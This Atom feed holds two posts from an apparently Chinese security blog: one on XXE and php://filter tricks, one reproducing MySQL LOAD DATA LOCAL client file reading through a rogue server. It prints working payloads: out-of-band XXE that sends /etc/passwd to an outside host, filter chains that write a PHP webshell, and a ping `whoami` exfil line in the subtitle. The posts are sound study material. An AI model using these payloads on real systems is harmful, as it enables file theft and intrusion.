<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Breezy&#39;s Blog</title>
  
  <subtitle>$&gt; ping -c 1 `whoami`.u.com</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://a1ne.github.io/"/>
  <updated>2020-04-04T02:46:15.219Z</updated>
  <id>http://a1ne.github.io/</id>
  
  <author>
    <name>Breezy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>协议tips</title>
    <link href="http://a1ne.github.io/2020/04/02/%E5%8D%8F%E8%AE%AEtips/"/>
    <id>http://a1ne.github.io/2020/04/02/%E5%8D%8F%E8%AE%AEtips/</id>
    <published>2020-04-03T00:35:31.000Z</published>
    <updated>2020-04-04T02:46:15.219Z</updated>
    
    <content type="html"><![CDATA[<p>最近遇到的很多利用，无论是XXE、SSRF还是任意文件读取，在实际利用过程中，无不和协议扯上关系。在debug过程中也遇到很多以前没注意的问题，特此记录一下。</p><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XXE一般是解析XML的时候调用了外部实体，通过外部实体读取内容回显出来或者通过向外的请求将数据带外。<br>实体简单来说就是某种变量，通过dtd(文档类型定义)的定义去引用(dtd也能够定义element去规定整个xml标签的结构)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE r[                  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; dtd</span><br><span class="line">&lt;!ELEMENT r ANY &gt;               &#x2F;&#x2F;接受任意元素</span><br><span class="line">&lt;!ENTITY s &quot;test&quot;&gt;              &#x2F;&#x2F;实体</span><br><span class="line">]&gt;</span><br><span class="line">&lt;username&gt;&amp;s;&lt;username&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>上述的请求在解析过程中会将<code>username</code>字段的值替换成上面定义的<code>test</code><br>实体分为内部和外部，外部实体用于是引用外部的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY s &quot;test&quot;&gt;       内部实体</span><br><span class="line">&lt;!ENTITY s SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;test.dtd&quot;&gt;   外部实体</span><br><span class="line"></span><br><span class="line">除了上述 外部实体的引入还可以使用公用dtd</span><br><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure><p>除了外部和内部的区别，实体还分为通用实体和参数实体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">通用实体</span><br><span class="line">通过&amp;xxx;引用的实体,DTD 中定义后在XML中引用</span><br><span class="line">&lt;!DOCTYPE r[&lt;!ENTITY s SYSTEM &quot;http:&#x2F;&#x2F;example.com&#x2F;public.dtd&quot;&gt;]&gt;</span><br><span class="line">&lt;username&gt;&amp;s;&lt;&#x2F;username&gt;</span><br><span class="line"></span><br><span class="line">参数实体</span><br><span class="line">通过%xxx;引用，只能在DTD中定义和使用，只有在外部dtd中参数实体定义才能引用其他实体</span><br><span class="line">&lt;!DOCTYPE r[</span><br><span class="line">&lt;!ENTITY % s SYSTEM &quot;http:&#x2F;&#x2F;example.com&#x2F;public.dtd&quot;&gt;</span><br><span class="line">%s;   -----&gt;引入外部dtd文件内容</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>通过外部实体的引入可以使得不用频繁更新当前xml结构，但是引入的时候没有做限制，就可能导致结合协议的任意文件读取或ssrf。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h4><p>最简单的场景就是一个登陆框，用xml形式传递用户名和密码。在请求后会将用户名回显出来。这时候就能够利用通用外部实体调用file协议读取敏感文件，然后通过响应的回显将文件内容显示出来，其他的协议类似，http、gopher、dict等协议可以实现进一步内网探测和攻击。<br>协议的支持偷一张小圆圆师傅(k0rz3n)的图</p><p><img src="/images/protocol/xxe_pro.png" alt="xxe_pro"><br>读文件时候文件特殊字符问题可以对应根据协议去绕过，最舒服的就是php伪协议，其他的java对应的jar协议能够实现文件的上传,或者phar协议RCE，但高版本的jdk移除了对gopher协议的支持，并且带外url中不支持<code>\n</code>，http协议和ftp协议(大部分版本)只能读取一行.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.rot13&#x2F;resource&#x3D;</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.strip_tags&#x2F;resource&#x3D; 去除特殊标签&lt;?php exit();?&gt;特别好使</span><br><span class="line">里面的协议支持管道string.strip_tags|convert.base64-encode</span><br></pre></td></tr></table></figure><p>php在安装扩展后还支持如下协议(同样盗图)</p><p><img src="/images/protocol/extension.png" alt="extension"></p><p>jar协议支持远程加载jar文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">格式:</span><br><span class="line">jar:url!&#x2F;path</span><br><span class="line">jar:http:&#x2F;&#x2F;breezy.com&#x2F;test.jar!&#x2F;payload&#x2F;shell</span><br><span class="line">!后面为jar包中实际文件</span><br><span class="line"></span><br><span class="line">调用jar协议会下载远程jar或zip包到本地(一般为xxxx.tmp)，提取出对应路径的文件后删除临时文件</span><br><span class="line">在提取jar包中不存在的文件时会爆出临时文件的路径,使用sleep或者添加特殊字符延长服务器读取文件删除的时间</span><br><span class="line">结合文件包含以及特殊的jar包构造可以实现getshell</span><br></pre></td></tr></table></figure><h4 id="带外"><a href="#带外" class="headerlink" title="带外"></a>带外</h4><p>通常存在回显可以直接将通用实体引入到xml文档中进行输出，但是很多时候无回显，如果能够出网，就可以使用带外的方式，借助参数实体传输数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE r[</span><br><span class="line">&lt;!ENTITY % s SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % out SYSTEM &quot;http:&#x2F;&#x2F;breezy.com&#x2F;payload.dtd&quot;&gt;</span><br><span class="line">%out;       &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;等同于将http:&#x2F;&#x2F;breezy.com&#x2F;payload.dtd内容宏替换到dtd中</span><br><span class="line">%call;       &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;引入 &lt;!ENTITY m SYSTEM &#39;http:&#x2F;&#x2F;breezy.com&#x2F;outband.php?$&#123;&#x2F;etc&#x2F;passwd&#125;&#39;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line"># http:&#x2F;&#x2F;breezy.com&#x2F;payload.dtd</span><br><span class="line">&lt;!ENTITY % call &quot;&lt;!ENTITY m SYSTEM &#39;http:&#x2F;&#x2F;breezy.com&#x2F;outband.php?%s;&#39;&gt;&quot;&gt; 参数实体只能通过外部dtd引用 本地引用会报错</span><br></pre></td></tr></table></figure><p>通过上面的例子可以看出引用相当于将实体的内容直接放到dtd文档中进行定义，因为不能直接在内部dtd中定义引用，一般需要先对外请求dtd文件，在外部的dtd文件中定义文件内容的替换。</p><p>除了常见的协议外，xml还支持一个特殊的标签<code>&lt;![CDATA[]]&gt;</code>，放在该标签内的内容会被转义成字符串处理。通过下述方式调用(因为需要引用内容，需要借助外部的dtd)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE r[</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">&lt;!ENTITY % content SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;user.xml&quot;&gt;</span><br><span class="line">&lt;!ENTITY % END &quot;]]&quot;&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;http:&#x2F;&#x2F;breezy.com&#x2F;payload.dtd&quot;&gt;</span><br><span class="line">%file</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">#http:&#x2F;&#x2F;breezy.com&#x2F;payload.dtd</span><br><span class="line">&lt;!ENTITY result &quot;%start;%content;%end;&quot;&gt;</span><br><span class="line"></span><br><span class="line">xml中通过&amp;result;引入 </span><br><span class="line">如果需要带外则修改如下,并在上述dtd中加入对result的引用</span><br><span class="line">&lt;!ENTITY % result &quot;&lt;!ENTITY m SYSTEM &#39;http:&#x2F;&#x2F;breezy.com&#x2F;?%start;%content;%end;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h4><p>报错可能是比较少见的一种方式，其实类似报错注入的方式，简单来讲就是构造错误让结果在错误中输出<br>在实际利用过程中因为Java 环境，jdk版本较高，只允许读取一行内容，走投无路尝试了一下ftp协议，结果出乎意料就通过报错出来了，遗憾的是有特殊符号的文件不能读取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;%data;xxxxx  直接将内容写到ftp协议请求地址最前面触发报错</span><br></pre></td></tr></table></figure><p>其他的协议在特殊字段构造错误，可能也能够将文件内容放在错误流中输出出来</p><h2 id="PHP-filter伪协议扩展"><a href="#PHP-filter伪协议扩展" class="headerlink" title="PHP filter伪协议扩展"></a>PHP filter伪协议扩展</h2><p>昨天看的一篇从艰难的ssrf到RCE,看了感觉绕来绕去，其实总结下来就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;ssrf 结合gopher协议利用低权限redis实现thinkphp 5.0.24任意文件写</span><br><span class="line"></span><br><span class="line">作者首先通过ssrf读取了thinkphp配置文件，发现存在的redis数据库</span><br><span class="line">redis未授权可以访问，gopher利用失败后dict协议发送info收集信息,结合pid在&#x2F;proc&#x2F;pid&#x2F;status获取到权限</span><br><span class="line">低权限计划任务和ssh authorized_keys不能写入，尝试写shell遇到dict协议不支持?写入</span><br><span class="line">用bitop op dst src1 src2(通过src1和src2 op操作位运算得到dst)尝试绕过失败</span><br><span class="line">随后尝试thinkphp的任意文件写，在redis获取数据代码以think_serialize触发</span><br><span class="line">触发点为file_put_contents($a.$random.&quot;.php&quot;,&quot;&lt;?php exit();?&gt;&quot;.$a)</span><br><span class="line">绕过php exit可以结合伪协议base64,rot13或者strip_tags</span><br><span class="line">作者在这里提供了按位反的两个用法 php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-4LE.UCS-4BE和php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE</span><br><span class="line">生成payload后取反后利用dict协议发送到redis使用bitop not取反恢复成功getshell</span><br></pre></td></tr></table></figure><p>今天又有师傅关于上文出了后续，学到的一点是php伪协议的过滤器如果无效，则原样输出，所以在针对<code>file_put_contents($a,&quot;&lt;?php exit();?&gt;&quot;.$a)</code>的利用中可以将payload插入到过滤器中。<br>无效过滤器会提示警告，但不影响文件写入，其中base64过滤器因为遇到<code>=</code>会停止解析从而爆长度错误(<code>stream filter (convert.base64-decode): invalid byte sequence</code>)，手动填充长度还是失败，<code>write</code>和<code>read</code>的等号可以去掉，但是<code>resource</code>后的等号必须存在，看了大佬的分析，可以通过在<code>resource=</code>前后加上标签。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;string.strip_tags|convert.base64-decode|aaPD9waHAgcGhwaW5mbygpOz8+|&lt;&#x2F;resource&#x3D;&gt;shell.php</span><br></pre></td></tr></table></figure><p><img src="/images/protocol/base64.png" alt="base64"><br>用<code>string.strip_tags</code>去除这种文件名会比较奇怪，并且在widnows因为通配符的原因不能访问到，可以加上<code>../</code>的方式来跨一个不存在目录写进当前目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;string.strip_tags|convert.base64-decode|aaPD9waHAgcGhwaW5mbygpOz8+|&lt;&#x2F;resource&#x3D;&gt;test&#x2F;..&#x2F;shell.php</span><br></pre></td></tr></table></figure><p>其他的<code>rot13</code>以及按位反转类似<br>看作者更新的文章还有一种用法是utf-8转成utf-7的，可以去掉其中的<code>=</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7|convert.base64-decode|AAPD9waHAgcGhwaW5mbygpOz8+&#x2F;resource&#x3D;shell.php</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a><br><a href="https://www.leadroyal.cn/?p=914" target="_blank" rel="noopener">9102年Java里的XXE</a><br><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">一篇文章带你理解漏洞之 XXE 漏洞</a><br><a href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/?nsukey=LuMh9W23UlxD1Q6nXIcNUsr9suqnF3TO0zRqdZPg%2BkD6Dk%2BU9fDfmHwYq7QHvk8TyGvslzMGZw2PsACk6SSraG6zW1zTDKG9x9Xs4rLfp95UPA0AICDXPf42GyyZvuNmcUZHQY1mhQCt4YkgdqoaKdEONoXVIfV%2BWnZWvvHcQGtJVVXEoVk82flPWyG3FxNfmVZY%2Bun0zBpVDS61gxjjjQ%3D%3D" target="_blank" rel="noopener">关于file_put_contents的一些小测试</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近遇到的很多利用，无论是XXE、SSRF还是任意文件读取，在实际利用过程中，无不和协议扯上关系。在debug过程中也遇到很多以前没注意的问题，特此记录一下。&lt;/p&gt;
&lt;h2 id=&quot;XXE&quot;&gt;&lt;a href=&quot;#XXE&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Mysql任意读取客户端文件</title>
    <link href="http://a1ne.github.io/2020/03/31/Mysql%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6/"/>
    <id>http://a1ne.github.io/2020/03/31/Mysql%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6/</id>
    <published>2020-04-01T00:04:00.000Z</published>
    <updated>2020-04-03T00:30:48.676Z</updated>
    
    <content type="html"><![CDATA[<p>一直都想填的一个坑，之前也想写文章记录一下，由于太忙了水了水就过去了，昨天又遇到了相关的情况，并且很多问题也是之前没有理解清楚的，特此记录一番。 // 刚好作为每天水文。</p><h2 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h2><p>标题为Mysql任意读取客户端文件，拆分一下，关键词为Mysql和客户端以及如何实现任意读取的问题。</p><p>Mysql会涉及到一个版本的问题，不同版本特性差异，比如<code>4.x</code>可能就没有记录数据库名、表名和列名的information_schema表，而高版本的还可能加入了<code>secure_file_priv</code>这种让你读写两难的设置。针对某些版本可能并没有任意读取的特性，而针对一些版本又可能默认设置为<code>OFF</code></p><p>客户端是因为Mysql为C/S模式的程序，直接通过<code>systemctl start mysql</code>启动的是服务端，开启后可以看到指定监听端口是开放状态，通过msyql客户端对其进行连接<code>mysql -u root -p -h 127.0.0.1 -P 3306</code>,从而操作服务端对数据进行<code>CRUD</code>(这里说的有点笼统，其实各种支持Mysql连接的语言，都有各自对应的客户端扩展)。</p><p>任意读取涉及到一个特殊的用法<code>load data</code>,从<a href="https://dev.mysql.com/doc/refman/8.0/en/load-data.html" target="_blank" rel="noopener">官方文档</a>可以看出来该用法是为了高速读取文件数据并将其插入到数据表中，与<code>select data into outfile</code>相反。一般而言<code>load data</code>读取的文件是命令执行者本地的文件，比如客户端发起请求需要读取<code>/etc/passwd</code>,这时候读取到的就是服务端的<code>/etc/passwd</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">LOAD DATA</span><br><span class="line">    [LOW_PRIORITY | CONCURRENT] [LOCAL]</span><br><span class="line">    INFILE &#39;file_name&#39;</span><br><span class="line">    [REPLACE | IGNORE]</span><br><span class="line">    INTO TABLE tbl_name</span><br><span class="line">    [PARTITION (partition_name [, partition_name] ...)]</span><br><span class="line">    [CHARACTER SET charset_name]</span><br><span class="line">    [&#123;FIELDS | COLUMNS&#125;</span><br><span class="line">        [TERMINATED BY &#39;string&#39;]</span><br><span class="line">        [[OPTIONALLY] ENCLOSED BY &#39;char&#39;]</span><br><span class="line">        [ESCAPED BY &#39;char&#39;]</span><br><span class="line">    ]</span><br><span class="line">    [LINES</span><br><span class="line">        [STARTING BY &#39;string&#39;]</span><br><span class="line">        [TERMINATED BY &#39;string&#39;]</span><br><span class="line">    ]</span><br><span class="line">    [IGNORE number &#123;LINES | ROWS&#125;]</span><br><span class="line">    [(col_name_or_user_var</span><br><span class="line">        [, col_name_or_user_var] ...)]</span><br><span class="line">    [SET col_name&#x3D;&#123;expr | DEFAULT&#125;,</span><br><span class="line">        [, col_name&#x3D;&#123;expr | DEFAULT&#125;] ...]</span><br></pre></td></tr></table></figure><p>在上述完整用法中能够看到<code>infile</code>参数,当参数被指定的时候会从客户端读取文件并发送到服务端</p><blockquote><p>If LOCAL is specified, the file is read by the client program on the client host and sent to the server. The file can be given as a full path name to specify its exact location. If given as a relative path name, the name is interpreted relative to the directory in which the client program was started.<br>When using LOCAL with LOAD DATA, a copy of the file is created in the directory where the MySQL server stores temporary files. See Section B.4.3.5, “Where MySQL Stores Temporary Files”. Lack of sufficient space for the copy in this directory can cause the LOAD DATA LOCAL statement to fail.</p></blockquote><p>因为平时都是直接使用客户端授权去连接服务端操作，默认环境是客户端可控，这个用法其实很正常，并且对于一些数据的备份转移很有帮助。</p><blockquote><p>load data local infile语法需要mysql版本在5.1以上<br>可以通过语句show variables like “%local%”; 查看是否开启  不支持可以在连接的时候加上–enable-local-infile</p></blockquote><h2 id="0x01-复现"><a href="#0x01-复现" class="headerlink" title="0x01 复现"></a>0x01 复现</h2><p>在实际情况中，很多网站为了方便远程管理并防止Mysql端口直接暴露，通常会使用一种类似PhpMyAdmin的管理工具作为客户端去管理服务器。如果支持外联，攻击者可以伪造数据库服务器提供连接，在其中执行上述语句对本地的文件(客户端文件)进行读取并插入到表中。</p><p>本地搭建adminer(版本需要在4.3.1到4.6.2间)进行复现<br><img src="/images/mysql_arbitrary_read/adminer.png" alt="adminer"><br>在mysql服务器上需要开启外连</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;mysql&#x2F;mariadb.conf.d&#x2F;50-server.cnf   修改bind-address 为0.0.0.0</span><br><span class="line">本地连接数据库</span><br><span class="line">use mysql;</span><br><span class="line">update user set host&#x3D;&quot;%&quot; where user&#x3D;&quot;root&quot;;</span><br><span class="line">service mysql restart </span><br><span class="line"></span><br><span class="line">新版的mysql认证方式默认为unix_socket，只允许默认的root用户从本地进行连接</span><br><span class="line">udpate user set plugin&#x3D;&quot;mysql_native_password&quot; where user&#x3D;&quot;root&quot;</span><br><span class="line">update user set authentication_string&#x3D;password(&#39;123456&#39;) where user&#x3D;&#39;root&#39;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>由于adminer是使用php的mysql客户端扩展进行连接，需要在<code>php.ini</code>中修改如下设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[MySQLi]</span><br><span class="line">mysqli.allow_local_infile &#x3D; On</span><br></pre></td></tr></table></figure><p>在adminer服务器和可控mysql服务器中分别朝<code>/etc/1</code>写入不同的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table test(content varchar(256));</span><br></pre></td></tr></table></figure><p><img src="/images/mysql_arbitrary_read/table.png" alt="table"><br>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load data local infile &quot;&#x2F;etc&#x2F;1&quot; into table test;</span><br><span class="line">select * form test;</span><br></pre></td></tr></table></figure><p><img src="/images/mysql_arbitrary_read/read.png" alt="read"><br>能够看到这里读取出来的内容是<code>web_server</code>也就是adminer web服务器写入的内容。</p><p>修改命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data infile &quot;&#x2F;etc&#x2F;1&quot; into table test;</span><br></pre></td></tr></table></figure><p><img src="/images/mysql_arbitrary_read/server.png" alt="server"><br>此时即是正常的读取文件的用法<br><strong>抓包</strong><br>第一步能够看到服务器向客户端发送自己的banner信息以及认证的方式</p><p><img src="/images/mysql_arbitrary_read/greet.png" alt="greet"></p><p>然后进行用户登录及初始化查询</p><p><img src="/images/mysql_arbitrary_read/init.png" alt="init"><br>客户端发起查询请求</p><p><img src="/images/mysql_arbitrary_read/select.png" alt="select"><br>服务端收到请求后会回复客户端请求的文件名</p><p><img src="/images/mysql_arbitrary_read/response.png" alt="response"><br>随后客户端会读取对应文件内容发送给服务端</p><p><img src="/images/mysql_arbitrary_read/send.png" alt="send"><br><strong>简化</strong><br>上述整体过程就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">客户端请求，服务端回复banner和登录信息</span><br><span class="line">客户端根据服务端回复发送登录数据,服务端校验响应</span><br><span class="line">客户端发起初始化查询(一个或多个，需要看基于的初始化环境，每次web端的查询都相当于与服务器交互一次)，服务端相应执行语句并返回结果</span><br><span class="line">客户端发送load data local infile 请求，服务端提取文件名回复文件读取请求</span><br><span class="line">客户端读取对应文件内容发送到服务端</span><br></pre></td></tr></table></figure><p>从官方文档中了解到，客户端是不会储存自身请求的，而是通过服务端的响应来执行操作，也就是无条件信任服务端，并且文件传送请求可以作为任意查询语句的响应</p><p><img src="/images/mysql_arbitrary_read/official.png" alt="officel"><br>因此上述过程可以改变为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">客户端请求，服务端回复banner和登录要求</span><br><span class="line">客户端按照对应类型构造自身登录数据发送给服务端,服务端校验响应</span><br><span class="line">客户端发起初始化查询，服务端回复文件读取请求</span><br><span class="line">客户端读取对应文件内容发送到服务端</span><br></pre></td></tr></table></figure><p>整个过程在客户端主动的情况下均可控，因此可以编写一个恶意服务器监听实现文件读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Loading</span><br></pre></td></tr></table></figure><h2 id="0x02-扩展"><a href="#0x02-扩展" class="headerlink" title="0x02 扩展"></a>0x02 扩展</h2><p>在有的时候文件内容存在特殊字符，读取过程中会出现空格截断或者读取不出的情况，一个解决思路是添加多个字段来存放空格分格后的内容，或者通过替换将特殊字符变成能够支持的字符，还有就是对文件内容进行编码。</p><p>如果是mysql客户端，最常见的用法就是hex编码，在上述语法中。明显不支持hex函数的加入，看似能够替换的<code>replace</code>关键字实际上是针对读取数据主键重复的处理。一般而言就需要采取多个字段自动分隔的手段。</p><p>鉴于上述是通过php的扩展实现，猜测读取文件可能是通过<code>file_get_contents()</code>之类的函数实现，而php是支持很多协议的<code>php,phar,zlib</code>等。可以通过各种协议的加入实现编码效果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">测试过程第一步可以简单实用file协议读取，优先判断扩展是否支持协议</span><br></pre></td></tr></table></figure><p>这里直接使用伪协议进行读取<br><img src="/images/mysql_arbitrary_read/protocol.png" alt="protocol"><br>读取内容解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d2ViX3NlcnZlcgo&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;</span><br><span class="line">web_server</span><br></pre></td></tr></table></figure><p>其他的类型如下，均存在任意读取问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MySQL Client</span><br><span class="line">PHP + mysql&#x2F;mysqli</span><br><span class="line">PHP + PDO (MYSQL_ATTR_LOCAL_INFILE)</span><br><span class="line">Python + MySQLdb</span><br><span class="line">Python3 + mysqlclient</span><br><span class="line">Java + JDBC Driver</span><br></pre></td></tr></table></figure><p>至于利用方式则需要看不同语言环境的支持情况.而且攻防其实是可以相互转化的，在攻击者对你进行扫描的时候，某些条件下可以伪装mysql服务器向其发送精简的payload读取任意文件。</p><h2 id="0x03-修复"><a href="#0x03-修复" class="headerlink" title="0x03 修复"></a>0x03 修复</h2><p>最简单的就是在客户端禁用掉对应的用法，或者对服务端进行校验，如果只是为了管理本地数据库，可以禁止外连。</p><blockquote><p>参考<br>Read MySQL Client’s File [<a href="https://lightless.me/archives/read-mysql-client-file.html]" target="_blank" rel="noopener">https://lightless.me/archives/read-mysql-client-file.html]</a><br>CSS-T | Mysql Client 任意文件读取攻击链拓展  [<a href="https://www.freebuf.com/vuls/225420.html]" target="_blank" rel="noopener">https://www.freebuf.com/vuls/225420.html]</a><br>Load data local infile packet format[<a href="https://dev.mysql.com/doc/internals/en/com-query-response.html]" target="_blank" rel="noopener">https://dev.mysql.com/doc/internals/en/com-query-response.html]</a><br>Greeting packet format [<a href="https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake]" target="_blank" rel="noopener">https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake]</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
